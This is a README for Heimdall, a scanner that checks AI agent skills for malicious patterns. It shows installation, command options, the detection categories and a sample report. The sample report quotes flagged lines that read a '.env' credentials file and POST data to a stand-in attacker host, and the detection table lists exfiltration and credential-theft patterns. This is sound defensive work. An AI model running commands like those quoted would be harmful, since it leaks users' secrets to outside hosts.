# Heimdall 👁️

**The Watchman of Asgard - Security Scanner for AI Agent Skills**

Heimdall scans OpenClaw/Clawdbot skills for malicious patterns before installation. Context-aware scanning reduces false positives by ~85% compared to naive pattern matching.

## Features

- 🔍 **60+ security patterns** across 10 categories
- 🧠 **Context-aware** - distinguishes docs vs code vs strings
- 🛡️ **Security tool detection** - auto-suppresses pattern examples in security tools
- 📊 **Severity scoring** - SAFE → LOW → MEDIUM → HIGH → CRITICAL
- 🎯 **Low false positives** - smart suppression for legitimate use cases

## Installation

```bash
# Clone
git clone https://github.com/henrino3/heimdall.git
cd heimdall

# Make executable
chmod +x skill-scan.py

# Optional: Add to PATH
ln -s $(pwd)/skill-scan.py ~/.local/bin/skill-scan
```

## Usage

```bash
# Basic scan
./skill-scan.py <path-to-skill>

# Examples
./skill-scan.py ~/skills/some-skill/
./skill-scan.py ./downloaded-skill/

# Options
./skill-scan.py --json <path>           # JSON output
./skill-scan.py -v <path>               # Verbose - show all findings
./skill-scan.py --strict <path>         # Ignore context, flag everything
./skill-scan.py --show-suppressed <path> # Show suppressed findings
```

## Detection Categories

| Category | Description | Severity |
|----------|-------------|----------|
| `credential_access` | .env, secrets/, API keys, tokens | HIGH-CRITICAL |
| `network_exfil` | curl/wget to external URLs, known exfil domains | HIGH-CRITICAL |
| `shell_exec` | subprocess, os.system, eval, exec | HIGH-CRITICAL |
| `filesystem` | Dangerous file operations, system files | MEDIUM-CRITICAL |
| `obfuscation` | Base64 exec, encoded payloads | HIGH-CRITICAL |
| `data_exfil` | Sending credentials externally | CRITICAL |
| `privilege` | sudo, chmod 777, setuid | HIGH-CRITICAL |
| `persistence` | crontab, bashrc injection | MEDIUM-HIGH |
| `crypto` | Crypto miners, mining pools | CRITICAL |

## Example Output

```
============================================================
🔍 SKILL SECURITY SCAN REPORT v2.0
============================================================
📁 Path: /home/user/skills/suspicious-skill
📄 Files scanned: 5
🔢 Active issues: 3
🔇 Suppressed (context-aware): 2
⚡ Max severity: HIGH
📋 Action: 🔴 HIGH - Do NOT install without audit
============================================================

🚨 HIGH (2 issues):
  [credential_access]
    • scripts/main.py:45  - Reading .env file
      Match: cat ~/.env
  [network_exfil]
    • scripts/main.py:52  - Curl to external URL
      Match: curl -X POST https://attacker.com

⚠️ MEDIUM (1 issues):
  [shell_exec]
    • scripts/helper.sh:12 [CONFIG] - Subprocess with list command
      Match: subprocess.run([

============================================================
❌ RECOMMENDATION: Do NOT install this skill without thorough review
```

## Context-Aware Scanning

Heimdall understands context:

| Context | Severity Adjustment | Example |
|---------|---------------------|---------|
| `CODE` | Full severity | Actual executable code |
| `CONFIG` | -1 level | YAML/JSON config files |
| `DOCS` | -3 levels | README, CHANGELOG, etc. |
| `STRING` | -3 levels | Pattern in string literal |

Security tools (like Prompt Guard) that contain attack patterns in their blocklists are automatically detected and suppressed.

## Why "Heimdall"?

In Norse mythology, Heimdall is the watchman of the gods. He guards the Bifrost bridge, can see for hundreds of miles, and hears grass growing. Perfect for a security scanner that watches over your AI agent skills.

## License

MIT

## Credits

Built by the Enterprise Crew (Ada 🔮, Spock 🖖, Scotty 🔧)
